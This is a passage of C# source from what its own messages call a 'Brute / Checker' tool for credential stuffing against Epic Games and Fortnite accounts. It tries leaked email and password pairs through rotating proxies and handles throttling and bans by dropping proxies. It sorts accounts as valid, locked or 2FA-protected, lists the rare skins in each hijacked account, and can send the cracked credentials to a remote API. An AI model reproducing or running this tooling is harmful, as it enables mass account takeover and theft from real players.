                                                new WebClient().DownloadString(APIText.Text + "?a=add-Account&email=" + AccUser + "&password=" + AccPass);
                                            }
                                            catch
                                            {

                                            }
                                        }
                                        if (!DisableCounterStats.Checked)
                                        {
                                            try
                                            {
                                                string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=70455683&digit=style/plain/1/&reloads=0");
                                            }
                                            catch
                                            {

                                            }
                                        }
                                        Interlocked.Increment(ref validcnt);
                                        break;
                                    }
                                    string str2 = Regex.Match(input, "\"access_token\" : \"(.*?)\",").Groups[1].Value;
                                    string str3 = Regex.Match(input, "\"account_id\" : \"(.*?)\"").Groups[1].Value;
                                    httpRequest.AddHeader("Authorization", string.Format("bearer {0}", str2));
                                    string characters = httpRequest.Post(string.Format("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/client/QueryProfile?profileId=athena&rvn=-1", str3), "{}", "application/json").ToString();
                                    httpRequest.AddHeader("Authorization", string.Format("bearer {0}", str2));
                                    string ExtraInfo = httpRequest.Post(string.Format("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/client/QueryProfile?profileId=common_core&rvn=-1", str3), "{}", "application/json").ToString();
                                    httpRequest.AddHeader("Authorization", string.Format("bearer {0}", str2));
                                    string AccountDetails = httpRequest.Get(string.Format("https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/" + str3)).ToString();
                                    //Start Dedicated item Check
                                    if (DedicatedRareSkin.Checked)
                                    {
                                        //Start Breaking Since Its Last
                                        break;
                                        //End Break Point
                                    }
                                    //End Dedicated Item List
                                    if (characters.Contains("AthenaCharacter"))
                                    {
                                        ChangeImage();
                                        if (APISender.Checked)
                                        {
                                            try
                                            {
                                                string AccUser = string.Format("{0}", WebUtility.UrlEncode(strArray[0]), strArray[1]);
                                                string AccPass = string.Format("{1}", WebUtility.UrlEncode(strArray[0]), strArray[1]);
                                                new WebClient().DownloadString(APIText.Text + "?a=add-Account&email=" + AccUser + "&password=" + AccPass);
                                            }
                                            catch
                                            {

                                            }
                                        }
                                        if (!DisableCounterStats.Checked)
                                        {
                                            try
                                            {
                                                string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=70455683&digit=style/plain/1/&reloads=0");
                                            }
                                            catch
                                            {

                                            }
                                        }
                                        Interlocked.Increment(ref validcnt);
                                        SaveData(account, characters, ExtraInfo, AccountDetails);
                                        if (ProgressEnabled.Checked == false)
                                        {
                                            if (!ProgressEnabled.Checked)
                                            {
                                                using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                {
                                                    LogNameSaver.WriteLine(account);
                                                }
                                            }
                                            WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Successful!");
                                            WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                        }
                                        using (StreamWriter swvalid = File.AppendText(validaccounts))
                                        {
                                            swvalid.WriteLine(account);
                                        }
                                        break;
                                    }
                                    if (!characters.Contains("AthenaCharacter") && characters.Contains("AthenaPickaxe:defaultpickaxe"))
                                    {
                                        if (SaveUselessAccounts.Checked)
                                        {
                                            if (APISender.Checked)
                                            {
                                                try
                                                {
                                                    string AccUser = string.Format("{0}", WebUtility.UrlEncode(strArray[0]), strArray[1]);
                                                    string AccPass = string.Format("{1}", WebUtility.UrlEncode(strArray[0]), strArray[1]);
                                                    new WebClient().DownloadString(APIText.Text + "?a=add-Account&email=" + AccUser + "&password=" + AccPass);
                                                }
                                                catch
                                                {

                                                }
                                            }
                                            if (!DisableCounterStats.Checked)
                                            {
                                                try
                                                {
                                                    string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=70455683&digit=style/plain/1/&reloads=0");
                                                }
                                                catch
                                                {

                                                }
                                            }
                                            Interlocked.Increment(ref validcnt);
                                            SaveData(account, characters, ExtraInfo, AccountDetails);
                                            if (ProgressEnabled.Checked == false)
                                            {
                                                if (!ProgressEnabled.Checked)
                                                {
                                                    using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                    {
                                                        LogNameSaver.WriteLine(account);
                                                    }
                                                }
                                                WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Successful!");
                                                WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                            }
                                            using (StreamWriter swvalid = File.AppendText(validaccounts))
                                            {
                                                swvalid.WriteLine(account);
                                            }
                                            break;
                                        }
                                        else if (SaveUselessAccounts.Checked == false)
                                        {
                                            if (!DisableCounterStats.Checked)
                                            {
                                                try
                                                {
                                                    string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=109958228&digit=style/plain/1/&reloads=0");
                                                }
                                                catch
                                                {

                                                }
                                            }
                                            Interlocked.Increment(ref invalidcnt);
                                            if (ProgressEnabled.Checked == false)
                                            {
                                                if (!ProgressEnabled.Checked)
                                                {
                                                    using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                    {
                                                        LogNameSaver.WriteLine(account);
                                                    }
                                                }
                                                WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Successful! But account useless");
                                                WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                            }
                                            using (StreamWriter swinvalid = File.AppendText(badaccounts))
                                            {
                                                swinvalid.WriteLine(account);
                                            }
                                            break;
                                        }
                                    }
                                    if (characters.Contains("Login is banned or does not posses the action"))
                                    {
                                        if (!DisableCounterStats.Checked)
                                        {
                                            try
                                            {
                                                string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=109958228&digit=style/plain/1/&reloads=0");
                                            }
                                            catch
                                            {

                                            }
                                        }
                                        Interlocked.Increment(ref invalidcnt);
                                        using (StreamWriter swbad = File.AppendText(badaccounts))
                                        {
                                            swbad.WriteLine(account);
                                        }
                                        if (ProgressEnabled.Checked == false)
                                        {
                                            if (!ProgressEnabled.Checked)
                                            {
                                                using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                {
                                                    LogNameSaver.WriteLine(account);
                                                }
                                            }
                                            WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Banned!");
                                            WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                        }
                                        break;
                                    }
                                    if (characters.Contains("Process exited before completing"))
                                    {
                                        if (!DisableCounterStats.Checked)
                                        {
                                            try
                                            {
                                                string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=109958228&digit=style/plain/1/&reloads=0");
                                            }
                                            catch
                                            {

                                            }
                                        }
                                        Interlocked.Increment(ref invalidcnt);
                                        if (ProgressEnabled.Checked == false)
                                        {
                                            if (!ProgressEnabled.Checked)
                                            {
                                                using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                {
                                                    LogNameSaver.WriteLine(account);
                                                }
                                            }
                                            WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Had an unknown error!");
                                            WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                        }
                                        break;
                                    }
                                }
                                else
                                {
                                    if (SingleAccountOath.Contains("Sorry the credentials you are using are invalid."))
                                    {
                                        if (!DisableCounterStats.Checked)
                                        {
                                            try
                                            {
                                                string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=109958228&digit=style/plain/1/&reloads=0");
                                            }
                                            catch
                                            {

                                            }
                                        }
                                        Interlocked.Increment(ref invalidcnt);
                                        using (StreamWriter swbad = File.AppendText(badaccounts))
                                        {
                                            swbad.WriteLine(account);
                                        }
                                        if (ProgressEnabled.Checked == false)
                                        {
                                            if (!ProgressEnabled.Checked)
                                            {
                                                using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                {
                                                    LogNameSaver.WriteLine(account);
                                                }
                                            }
                                            WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Invalid!");
                                            WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                        }
                                        break;
                                    }
                                    if (SingleAccountOath.Contains("Two-Factor authentication required to process"))
                                    {
                                        Interlocked.Increment(ref lockedCuz2Fa);
                                        using (StreamWriter twostep = File.AppendText(TWOFAaccounts))
                                        {
                                            twostep.WriteLine(account);
                                        }
                                        if (ProgressEnabled.Checked == false)
                                        {
                                            if (!ProgressEnabled.Checked)
                                            {
                                                using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                {
                                                    LogNameSaver.WriteLine(account);
                                                }
                                            }
                                            WhatIsHappeningListbox.Items.Add(account + " Has Two Step Enabled!");
                                            WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                        }
                                        break;
                                    }
                                    if (SingleAccountOath.Contains("Operation access is limited by throttling policy") || input.Contains("exchange_code_not_found") || input.Contains("403 Forbidden"))
                                    {
                                        Interlocked.Increment(ref retrycnt);
                                        if (ProgressEnabled.Checked == false)
                                        {
                                            if (!ProgressEnabled.Checked)
                                            {
                                                using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                {
                                                    LogNameSaver.WriteLine(account);
                                                }
                                            }
                                            WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Retry, Proxy Bad!");
                                            WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                        }
                                        if (EnableRemoveBadProxies.Checked)
                                        {
                                            Proxies.RemoveAll(x => x.StartsWith(httpRequest.Proxy.ToString()));
                                        }
                                    }
                                    else
                                    {
                                        if (SingleAccountOath.Contains("Real ID association is required"))
                                        {
                                            if (!DisableCounterStats.Checked)
                                            {
                                                try
                                                {
                                                    string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=109958228&digit=style/plain/1/&reloads=0");
                                                }
                                                catch
                                                {

                                                }
                                            }
                                            Interlocked.Increment(ref invalidcnt);
                                            using (StreamWriter swbad = File.AppendText(badaccounts))
                                            {
                                                swbad.WriteLine(account);
                                            }
                                            break;
                                        }
                                        if (SingleAccountOath.Contains("Please reset your password to proceed with login"))
                                        {
                                            if (!DisableCounterStats.Checked)
                                            {
                                                try
                                                {
                                                    string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=109958228&digit=style/plain/1/&reloads=0");
                                                }
                                                catch
                                                {

                                                }
                                            }
                                            Interlocked.Increment(ref invalidcnt);
                                            using (StreamWriter swbad = File.AppendText(badaccounts))
                                            {
                                                swbad.WriteLine(account);
                                            }
                                            if (ProgressEnabled.Checked == false)
                                            {
                                                if (!ProgressEnabled.Checked)
                                                {
                                                    using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                    {
                                                        LogNameSaver.WriteLine(account);
                                                    }
                                                }
                                                WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Needs Password Reset!");
                                                WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                            }
                                            break;
                                        }
                                        if (SingleAccountOath.Contains("Process exited before completing"))
                                        {
                                            if (!DisableCounterStats.Checked)
                                            {
                                                try
                                                {
                                                    string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=109958228&digit=style/plain/1/&reloads=0");
                                                }
                                                catch
                                                {

                                                }
                                            }
                                            Interlocked.Increment(ref invalidcnt);
                                            if (ProgressEnabled.Checked == false)
                                            {
                                                if (!ProgressEnabled.Checked)
                                                {
                                                    using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                    {
                                                        LogNameSaver.WriteLine(account);
                                                    }
                                                }
                                                WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Had an unknown error!");
                                                WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                            }
                                            break;
                                        }
                                        if (SingleAccountOath.Contains("account has been locked because of too many invalid login attempts"))
                                        {
                                            if (!DisableCounterStats.Checked)
                                            {
                                                try
                                                {
                                                    string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=109958228&digit=style/plain/1/&reloads=0");
                                                }
                                                catch
                                                {

                                                }
                                            }
                                            Interlocked.Increment(ref invalidcnt);
                                            using (StreamWriter swbad = File.AppendText(badaccounts))
                                            {
                                                swbad.WriteLine(account);
                                            }
                                            if (ProgressEnabled.Checked == false)
                                            {
                                                if (!ProgressEnabled.Checked)
                                                {
                                                    using (StreamWriter LogNameSaver = File.AppendText("TCM's Progress.log"))
                                                    {
                                                        LogNameSaver.WriteLine(account);
                                                    }
                                                }
                                                WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Locked!");
                                                WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                            }
                                            break;
                                        }
                                        Interlocked.Increment(ref errorcnt);
                                        //if (ProgressEnabled.Checked == false)
                                        //{
                                        //WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Had an unknown error!");
                                        //WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                        //}
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                Interlocked.Increment(ref errorcnt);
                                if (RemoveProxiesWithErrors.Checked)
                                {
                                    Proxies.RemoveAll(x => x.StartsWith(httpRequest.Proxy.ToString()));
                                    //Proxies.RemoveAll(u => u.Contains(httpRequest.Proxy.ToString()));
                                }
                                //if (ProgressEnabled.Checked == false)
                                //{
                                //WhatIsHappeningListbox.Items.Add("Login To Account: " + account + " Had an unknown error!");
                                //WhatIsHappeningListbox.SelectedIndex = WhatIsHappeningListbox.Items.Count - 1;
                                //}
                            }
                        }
                    }
                    if (!DisableCounterStats.Checked)
                    {
                        try
                        {
                            string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=170254331&digit=style/plain/1/&reloads=0");
                        }
                        catch
                        {

                        }
                    }
                    Interlocked.Increment(ref checkedcnt);
                    TotalProxiesLeft.Text = "Proxies Left: " + Proxies.Count();
                    if (RemoveWhenChecked.Checked)
                    {
                        Combo.Remove(account);
                    }
                }
            }
            Thread.Sleep(ThreadSleepCount);
        }




        public void StartWorkProxyCheck()
        {
            isDone = false;
            int ThreadCount = (int)BannedProxyThreadToRun.Value;
            int SleepTimer = (int)BannedProxyCheckSleepTime.Value;
            Threadscount = ThreadCount;
            ThreadSleepCount = 100;

            for (int i = 0; i < Threadscount; i++)
            {
                Thread thread = new Thread(new ThreadStart(DoWorkProxyCheck2));
                thread.IsBackground = true;
                tList.Add(thread);
                thread.Start();
            }
            new Thread(() =>
            {
                while (Proxies.Count > 5)
                {
                    Thread.Sleep(SleepTimer);
                }
                isDone = true;
                base.Invoke(new Action(delegate
                {
                    _Run = false;
                    timer1.Stop();
                    StopCheckingBanProxy.Enabled = false;
                    BtnStartProxies.Enabled = true;
                    if (!IfPaauseTheList.Checked)
                    {
                        MessageBox.Show("Brute / Checker has finished successfully.");
                    }
                    else if (IfPaauseTheList.Checked)
                    {
                        MessageBox.Show("Brute / Checker has been paused, Hit Start to start again!");
                    }
                    btnStart.Enabled = true;
                    btnStop.Enabled = true;
                    bunifuTransition1.ShowSync(btnStart);
                    bunifuTransition1.HideSync(btnStop);
                }));
            })
            {
                IsBackground = true
            }.Start();
        }

        private void DoWorkProxyCheck2()
        {
            _IsGood = true;
            while (_Run)
            {
                lock (tLock)
                {
                    if (Proxies.Count > 5)
                    {

                    }
                    else
                    {
                        _Run = false;
                        _IsGood = false;
                        break;
                    }
                }
                if (Proxies.Count >= 0)
                {
                    while (_IsGood)
                    {
                        if (_Run.Equals(false))
                            return;
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            try
                            {
                                httpRequest.ClearAllHeaders();
                                int ProxyTimeoutTimer = (int)BannedProxyCheckTimeout.Value;
                                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0";
                                httpRequest.KeepAlive = true;
                                httpRequest.Cookies = new CookieDictionary(false);
                                httpRequest.IgnoreProtocolErrors = true;
                                httpRequest.ConnectTimeout = ProxyTimeoutTimer;
                                httpRequest.AllowAutoRedirect = false;
                                httpRequest.Proxy = GetPClient(Proxies.ElementAt<string>(rnd.Next(Proxies.Count)));
                                httpRequest.Proxy.ConnectTimeout = ProxyTimeoutTimer;
                                Random randomGenerator = new Random();
                                int RandomEmail = randomGenerator.Next(10000000);
                                var req = new HttpRequest();
                                req.Cookies = new CookieDictionary(false);
                                string response = req.Get("https://www.epicgames.com/id/api/csrf").ToString();
                                var value = req.Cookies["XSRF-TOKEN"];
                                httpRequest.AddHeader("x-xsrf-token", value);
                                string SingleAccountInfo = string.Format("email={0}&password={1}&rememberMe=False", "username" + RandomEmail + "@gmail.com", "Password" + RandomEmail);
                                string SingleAccountOath = httpRequest.Post("https://www.epicgames.com/id/api/login", SingleAccountInfo, "application/x-www-form-urlencoded").ToString();

                                httpRequest.AddHeader("x-xsrf-token", value);
                                string GetOath1 = httpRequest.Get("https://www.epicgames.com/id/api/redirect").ToString();
                                httpRequest.AddHeader("x-xsrf-token", value);
                                string GetOath2 = httpRequest.Get("https://www.epicgames.com/id/api/exchange").ToString();
                                MessageBox.Show(GetOath2);
                                JToken AccessToken = JObject.Parse(GetOath2)["code"];
                                httpRequest.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");
                                string OathThisShit = string.Format("grant_type=exchange_code&exchange_code=" + AccessToken + "&token_type=eg1");
                                string input = httpRequest.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", OathThisShit, "application/x-www-form-urlencoded").ToString();

                                if (10 > 1)
                                {
                                    if (input.Contains("Operation access is limited by throttling policy"))
                                    {
                                        BadProxies = BadProxies + 1;
                                        try
                                        {
                                            Proxies.RemoveAll(s => s.TrimStart().StartsWith(httpRequest.Proxy.ToString(), StringComparison.OrdinalIgnoreCase));
                                            Proxies.Remove(httpRequest.Proxy.ToString());
                                        }
                                        catch
                                        {

                                        }
                                        if (ShowBannedProxies.Checked)
                                        {
                                            try
                                            {
                                                if(!InvalidProxyListTextBox.Text.Contains(httpRequest.Proxy.ToString()))
                                                {
                                                    InvalidProxyListTextBox.Text += httpRequest.Proxy.ToString() + Environment.NewLine;
                                                }
                                            }
                                            catch { }
                                        }
                                        if (SaveBadProxies.Checked)
                                        {
                                            using (StreamWriter BProxies = File.AppendText(BadProxiesChecked))
                                            {
                                                BProxies.WriteLine(httpRequest.Proxy);
                                            }
                                        }
                                    }
                                    else if (!input.Contains("Operation access is limited by throttling policy"))
                                    {
                                        GoodProxies = GoodProxies + 1;
                                        try
                                        {
                                            Proxies.RemoveAll(s => s.TrimStart().StartsWith(httpRequest.Proxy.ToString(), StringComparison.OrdinalIgnoreCase));
                                            Proxies.Remove(httpRequest.Proxy.ToString());
                                        }
                                        catch
                                        {

                                        }
                                        if (ShowValidProxies.Checked)
                                        {
                                            try
                                            {
                                                if (!ValidProxyListTextBox.Text.Contains(httpRequest.Proxy.ToString()))
                                                {
                                                    ValidProxyListTextBox.Text += httpRequest.Proxy.ToString() + Environment.NewLine;
                                                }
                                            }
                                            catch { }
                                        }
                                        if (SaveValidProxies.Checked)
                                        {
                                            using (StreamWriter Gproxies = File.AppendText(GoodProxiesSave))
                                            {
                                                Gproxies.WriteLine(httpRequest.Proxy);
                                            }
                                        }
                                    }
                                    ProxyCheckingCurrent.Text = ("Currently Checking: " + httpRequest.Proxy);
                                    UpdateProxyStats();
                                        InvalidProxyListTextBox.SelectionStart = InvalidProxyListTextBox.TextLength;
                                        InvalidProxyListTextBox.ScrollToCaret();
                                        ValidProxyListTextBox.SelectionStart = ValidProxyListTextBox.TextLength;
                                        ValidProxyListTextBox.ScrollToCaret();
                                        break;
                                }
                            }
                            catch (Exception ex)
                            {
                                        UpdateProxyStats();
                                        try
                                        {
                                            Proxies.RemoveAll(s => s.TrimStart().StartsWith(httpRequest.Proxy.ToString(), StringComparison.OrdinalIgnoreCase));
                                            Proxies.Remove(httpRequest.Proxy.ToString());
                                        }
                                        catch { }
                                        DeadProxies = DeadProxies + 1;
                            }
                        }
                    }
                }
            }
            Thread.Sleep(ThreadSleepCount);
        }

        private ProxyClient GetPClient(string proxy)
        {
            switch (PType)
            {
                case ProxyType.Http:
                    return HttpProxyClient.Parse(proxy);
                case ProxyType.Socks4:
                    return Socks4aProxyClient.Parse(proxy);
                case ProxyType.Socks5:
                    return Socks5ProxyClient.Parse(proxy);
                default:
                    return HttpProxyClient.Parse(proxy);
            }
        }

        private void SaveData(string account, string characters, string ExtraInfo, string AccountDetails)
        {
            try
            {
                if (ListBoxDisableText.Checked == false)
                {
                    FnBattleRoyalLB.BeginUpdate();
                }
                if (ListBoxDisableText.Checked)
                {
                    FnBattleRoyalLB.Items.Clear();
                }
                base.Invoke(new MethodInvoker(delegate
                {
                    using (StreamWriter sw = File.AppendText(textfile))
                    {
                        string x = characters;
                        string c = ExtraInfo;
                        string a = AccountDetails;
                        if(IsUsingTradingSystem == false)
                        {
                            ShowNotification("Valid Account Found!", account + " Is Valid!");
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("-------------------<EpicAccount>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("-------------------<EpicAccount>------------------------");
                            }
                            sw.WriteLine("- Login: " + account);
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("- Login: " + account);
                            }
                        }
                        int TotalSkins = 0;
                        if (CheckForSkins.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                FnBattleRoyalLB.Items.Add("----------------------<Skins>---------------------------");
                            }
                            sw.WriteLine("----------------------<Skins>---------------------------");
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            bool noSkin = !x.Contains("AthenaCharacter");
                            if (noSkin)
                            {
                                sw.WriteLine("=> No Skin But Account Valid");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> No Skin But Account Valid");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                            }
                            bool flag = x.Contains("AthenaCharacter:cid_036_athena_commando_m_wintercamo");
                            if (flag)
                            {
                                sw.WriteLine("=> Absolute Zero");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Absolute Zero");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag2 = x.Contains("AthenaCharacter:cid_121_athena_commando_m_graffiti");
                            if (flag2)
                            {
                                sw.WriteLine("=> Abstrakt");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Abstrakt");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag3 = x.Contains("AthenaCharacter:cid_017_athena_commando_m");
                            if (flag3)
                            {
                                sw.WriteLine("=> Aerial Assault Trooper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Aerial Assault Trooper");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                if (AerialAssaultTrooperSaveFile.Checked)
                                {
                                    using (StreamWriter AerialAssaultTrooperS = File.AppendText(AerialAssaultTrooper))
                                    {
                                        AerialAssaultTrooperS.WriteLine(account);
                                    }
                                }
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag4 = x.Contains("AthenaCharacter:cid_059_athena_commando_m_skidude_chn");
                            if (flag4)
                            {
                                sw.WriteLine("=> Alpine Ace (CHN)");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Alpine Ace (CHN)");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag5 = x.Contains("AthenaCharacter:cid_055_athena_commando_m_skidude_can");
                            if (flag5)
                            {
                                sw.WriteLine("=> Alpine Ace (CAN)");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Alpine Ace (CAN)");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag6 = x.Contains("AthenaCharacter:cid_058_athena_commando_m_skidude_ger");
                            if (flag6)
                            {
                                sw.WriteLine("=> Alpine Ace (GER)");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Alpine Ace (GER)");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag7 = x.Contains("AthenaCharacter:cid_037_athena_commando_f_wintercamo");
                            if (flag7)
                            {
                                sw.WriteLine("=> Arctic Assassin");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Arctic Assassin");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag8 = x.Contains("AthenaCharacter:cid_015_athena_commando_f");
                            if (flag8)
                            {
                                sw.WriteLine("=> Arctic Assassin");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Arctic Assassin");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag9 = x.Contains("AthenaCharacter:cid_100_athena_commando_m_cuchulainn");
                            if (flag9)
                            {
                                sw.WriteLine("=> Battle Hound");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Battle Hound");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag10 = x.Contains("AthenaCharacter:cid_125_athena_commando_m_tacticalwoodland");
                            if (flag10)
                            {
                                sw.WriteLine("=> BattleHawk");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> BattleHawk");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag11 = x.Contains("AthenaCharacter:cid_035_athena_commando_m_medieval");
                            if (flag11)
                            {
                                sw.WriteLine("=> Black Knight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Black Knight");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=37910540&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref rareskins);
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                                if (BlackKnightSaveFile.Checked)
                                {
                                    using (StreamWriter Bknight = File.AppendText(BlackKnight))
                                    {
                                        Bknight.WriteLine(account);
                                    }
                                }
                            }
                            bool flag12 = x.Contains("AthenaCharacter:cid_032_athena_commando_m_medieval");
                            if (flag12)
                            {
                                sw.WriteLine("=> Blue Squire");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Blue Squire");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag13 = x.Contains("AthenaCharacter:cid_138_athena_commando_m_psburnout");
                            if (flag13)
                            {
                                sw.WriteLine("=> Blue Striker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Blue Striker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag14 = x.Contains("AthenaCharacter:cid_052_athena_commando_f_psblue");
                            if (flag14)
                            {
                                sw.WriteLine("=> Blue Team Leader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Blue Team Leader");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag15 = x.Contains("AthenaCharacter:cid_021_athena_commando_f");
                            if (flag15)
                            {
                                sw.WriteLine("=> Brawler");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brawler");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag16 = x.Contains("AthenaCharacter:cid_092_athena_commando_f_redshirt");
                            if (flag16)
                            {
                                sw.WriteLine("=> Brilliant Striker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brilliant Striker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool flag17 = x.Contains("AthenaCharacter:cid_044_athena_commando_f_scipop");
                            if (flag17)
                            {
                                sw.WriteLine("=> Brite Bomber ");
